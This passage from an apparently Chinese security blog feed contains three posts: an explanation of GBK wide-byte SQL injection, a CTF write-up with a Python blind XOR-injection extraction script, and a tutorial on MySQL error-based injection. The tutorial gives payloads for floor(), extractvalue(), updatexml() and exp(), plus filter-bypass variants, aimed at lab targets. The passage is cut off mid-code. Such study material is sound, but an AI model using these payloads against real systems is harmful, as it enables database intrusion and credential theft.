    <content type="html"><![CDATA[<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p>在mysql中，用于转义（即在字符串中的符号前加上”\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。</p></blockquote><h4 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h4><blockquote><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p></blockquote><h4 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h4><blockquote><p>宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p><p>替换反斜杠，反斜杠的GBK编码为%5C，根据GBK编码在前面加上%DE，%DF，%E0都可以组成一个汉字，从而把反斜杠给‘吃’了</p></blockquote><p><img src="https://i.loli.net/2021/03/27/2qU1WxSmDf4GusO.png" alt="1"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019 FinalSQL</title>
    <link href="/2022/03/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/"/>
    <url>/2022/03/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/</url>
    
    <content type="html"><![CDATA[<h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>2&#x2F;10&#x2F;2021</p><p><img src="https://i.loli.net/2021/03/02/pAvQ35nylFcTPIW.png" alt="75503-llgb4y2ilgl.png"><br>对id进行fuzzing测试</p><p><img src="https://i.loli.net/2021/03/02/ECmGluoTKM7Y1vi.png" alt="45493-ymkl3sxh7bp.png"></p><p>发现union被过滤 题目提示有盲注 ^(异或符号也没有过滤) 可使用异或注入进行测试</p><p>sql异或注入</p><blockquote><p>当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入<br>异或运算规则:<br>1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1<br>111&#x3D;0 110&#x3D;0<br>构造payload:’ascii(substr(database(),1,1)&#x3D;98)0<br>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p></blockquote><p><img src="https://i.loli.net/2021/03/02/rCodswBg8nI2D3t.png" alt="70119-zuy2jrwn9le.png"><br><img src="https://i.loli.net/2021/03/02/MDPsEIwoe5auQ2U.png" alt="85919-5kk8xek7vyg.png"></p><p>使用异或注入<br>结合盲注思想构造payload 编写python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://6f69905f-aaba-42af-9326-9086aa162a65.node3.buuoj.cn/search.php?id=&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    left = <span class="hljs-number">32</span><br>    right = <span class="hljs-number">127</span><br>    mid = (left + right) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> left &lt; right:<br>        <span class="hljs-comment"># payload = url + &quot;1^(ascii(substr((select(database())),&#123;&#125;,1))&lt;&#123;&#125;)^1&quot;.format(i, mid)</span><br>        <span class="hljs-comment"># payload = url + &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;&#123;&#125;)^1&quot;.format(i, mid)</span><br>        payload = url + <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)^1&quot;</span>.<span class="hljs-built_in">format</span>(<br>             i, mid)<br>        <span class="hljs-comment"># payload = url + &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&lt;&#123;&#125;)^1&quot;.format(i, mid)</span><br>        res = requests.get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;others~~~&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            right = mid<br>        <span class="hljs-keyword">else</span>:<br>            left = mid + <span class="hljs-number">1</span><br>        mid = (left + right) // <span class="hljs-number">2</span><br>        time.sleep(<span class="hljs-number">0.5</span>)<br><br>    <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>        <span class="hljs-keyword">break</span><br><br>    flag += <span class="hljs-built_in">chr</span>(mid - <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p>依次切换payload即可得到flag</p><p><img src="https://i.loli.net/2021/03/02/rTzbhdjHQpE9FGv.png" alt="12856-se4gfxvl0vm.png"></p><p><img src="https://i.loli.net/2021/03/02/hIv4AcujCmW1Ps5.png" alt="27296-oc8e1t4pgbn.png"></p><p><img src="https://i.loli.net/2021/03/02/3Q4WLSabnTuzgjN.png" alt="82897-tqb8710x33g.png"></p><p><img src="https://i.loli.net/2021/03/02/XwejIVMQFWA8Hnh.png" alt="61103-agz49v4p2pw.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>报错注入总结</title>
    <link href="/2022/03/03/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/03/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><blockquote><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p></blockquote><h5 id="floor"><a href="#floor" class="headerlink" title="floor ()"></a>floor ()</h5><p>利用 floor () 函数使 SQL 语句报错，实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的。<br>首先，看一下语句中使用到的函数和子句：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. concat： 连接字符串功能<br><span class="hljs-attribute">2</span>. floor： 取float的整数值(向下取整）<br><span class="hljs-attribute">3</span>. rand： 取<span class="hljs-number">0</span>~<span class="hljs-number">1</span>之间的随机浮点值<br><span class="hljs-attribute">4</span>. group by： 根据一个或多个列对结果集进行分组并有排序功能<br><span class="hljs-attribute">5</span>. floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)： 随机产生<span class="hljs-number">0</span>或<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h6 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h6><p>使用floor(rand(0)*2)时,返回的值一直为011011</p><blockquote><ol><li><p>查询第一条记录，rand(0)得键值0不存在临时表，执行插入，此时rand(0)再执行，得1，于是插入了1。</p></li><li><p>查询第二条记录，rand(0)得1，键值1存在临时表，则值加1得2。</p></li><li><p>查询第三条记录，rand(0)得0，键值0不存在临时表，执行插入，rand(0)再次执行，得键值1，1存在于临时表，由于键值必须唯一，导致报错。</p><p>由上述可得，表中必须存在大于等于3条记录才会产生报错</p></li></ol></blockquote><p>刚才已经说了 利用 floor () 的报错注入实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的</p><p>当数据行数大于3, floor(rand(0)*2)必定报错</p><p>以sqli-labs第5关为例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#爆数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))test from information_schema.tables group by test--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆表</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))test <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> test<span class="hljs-comment">--+</span><br><br>#爆字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),0x7e,floor(rand(0)*2))test from information_schema.tables group by test--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆值</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))test <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> test<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>[^0x7e是16进制的~]:</p><h6 id="concat-与group-concat-的区别"><a href="#concat-与group-concat-的区别" class="headerlink" title="concat()与group_concat()的区别"></a>concat()与group_concat()的区别</h6><blockquote><p>1、concat()函数</p><p>功能：将多个字符串连接成一个字符串。</p><p>语法：concat(str1, str2,…)</p><p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p>值得注意的是每次只返回的是一行的数据。</p><p>2、group_concat()函数</p><p>group_concat()函数是将所有的查询结果拼接成一个字符串返回，不过在不同的字段值之间默认是用逗号隔开的</p></blockquote><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p><p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p><p>例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));<br></code></pre></td></tr></table></figure><h6 id="报错原理-1"><a href="#报错原理-1" class="headerlink" title="报错原理"></a>报错原理</h6><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">EXTRACTVALUE <span class="hljs-comment">(XML_document, XPath_string)</span>;<br></code></pre></td></tr></table></figure><blockquote><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串).</li><li>作用：从目标XML中返回包含所查询值的字符串</li></ul></blockquote><p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p><p>我们可以让它第二个参数错误来爆出数据。</p><p>以sqli-labs第5关为例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#爆数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆表</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+</span><br><br>#爆字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),0x7e))--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆值</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h6 id="极客大挑战-2019-HardSQL-报错注入"><a href="#极客大挑战-2019-HardSQL-报错注入" class="headerlink" title="[极客大挑战 2019]HardSQL 报错注入"></a>[极客大挑战 2019]HardSQL 报错注入</h6><p>使用报错注入绕过关键字注入</p><blockquote><p>使用字典fuzz一下，发现过滤了空格，and，1&#x3D;1，union，select，sleep，&#x3D;等关键字<br>但是没有过滤informaion_schema，updatexml等关键字，说明让我们使用报错注入，<br>and被过滤可以使用or或者异或^代替，空格被过滤可以使用括号代替，&#x3D;号可以使用like代替</p></blockquote><p>爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(extractvalue(1,concat(&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,database())))%23</span><br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(extractvalue(1,concat(&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="hljs-string">&#x27;)))))%23</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(extractvalue(1,concat(&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(&#x27;</span>geek<span class="hljs-string">&#x27;)))))%23</span><br></code></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(extractvalue(1,concat(&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,(select(group_concat(password))from(geek.H4rDsq1)))))%23</span><br></code></pre></td></tr></table></figure><blockquote><p>这个时候flag只出来了一半</p><p>这时候就要想到mysql的一些函数，substr，left，right<br>注意：substr被过滤了</p></blockquote><p>mysql中的 left() right()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">LEFT</span>(str,len)<br>返回从字符串str最左边的len个字符，如果任一参数为<span class="hljs-keyword">null</span>则返回<span class="hljs-keyword">null</span>。<br><br><span class="hljs-keyword">RIGHT</span>(str,len)<br>返回从字符串str最右边的len个字符，如果任一参数为<span class="hljs-keyword">null</span>则返回<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p>下面使用right()函数 获取后半段flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(extractvalue(1,concat(&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,(select(group_concat(right(password,30)))from(geek.H4rDsq1)))))%23</span><br></code></pre></td></tr></table></figure><p>与前半段 拼接后得到flag</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><blockquote><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p><p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p></blockquote><h6 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><h6 id="报错原理-2"><a href="#报错原理-2" class="headerlink" title="报错原理"></a>报错原理</h6><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">UPDATEXML (XML_document, XPath_string, <span class="hljs-keyword">new</span><span class="hljs-type">_value</span>);<br></code></pre></td></tr></table></figure><blockquote><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串)</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li></ul><p>作用：改变文档中符合条件的节点的值<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p></blockquote><p>其实原理和extractvalue()是一样的，利用Xpath格式字符串不符合要求达到报错的效果，但是不一样的是，updatexml()有<strong>3个参数</strong>，要注意这一点。</p><p>以sqli-labs第5关为例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#爆数据库名<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆表</span><br><span class="hljs-string">http:192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#爆字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆值</span><br><span class="hljs-string">http://192.168.100.100:8080/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><blockquote><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p><p>利用exp函数也产生类似的溢出错误</p></blockquote><h6 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x));<br>ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((<span class="hljs-keyword">select</span> <span class="hljs-symbol">`x`</span>.<span class="hljs-symbol">`database()`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">AS</span> <span class="hljs-symbol">`database()`</span>) <span class="hljs-symbol">`x`</span>)))<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>注意，exp()产生错误，但是并没有爆出database()，但是发现database() 是表达式，在脚本语言中会转化为相应的值，从而爆出数据库名。</p><h6 id="报错原理-3"><a href="#报错原理-3" class="headerlink" title="报错原理"></a>报错原理</h6><blockquote><p>exp是以e为底的指数函数，但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select exp(709);</span><br><span class="hljs-section">+-----------------------+</span><br><span class="hljs-section">| exp(709)              |</span><br><span class="hljs-section">+-----------------------+</span><br><span class="hljs-section">| 8.218407461554972e307 |</span><br><span class="hljs-section">+-----------------------+</span><br>1 row in set (0.00 sec)<br><br>mysql&gt; select exp(710);<br>ERROR 1690 (22003): DOUBLE value is out of range in <span class="hljs-emphasis">&#x27;exp(710)&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select ~0;</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| ~0                   |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| 18446744073709551615 |</span><br><span class="hljs-section">+----------------------+</span><br>1 row in set (0.00 sec) <br><br><span class="hljs-section">mysql&gt; select ~(select version());</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| ~(select version())  |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| 18446744073709551610 |</span><br><span class="hljs-section">+----------------------+</span><br>1 row in set, 1 warning (0.00 sec)<br></code></pre></td></tr></table></figure><p>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x));<br>ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((<span class="hljs-keyword">select</span> <span class="hljs-symbol">`x`</span>.<span class="hljs-symbol">`database()`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">AS</span> <span class="hljs-symbol">`database()`</span>) <span class="hljs-symbol">`x`</span>)))<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>在脚本语言中，就会将错误中的一些表达式转化成相应的字符串,从而爆出数据。</p><p>以sqli-labs第5关为例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#爆数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.100</span>:<span class="hljs-number">8080</span><span 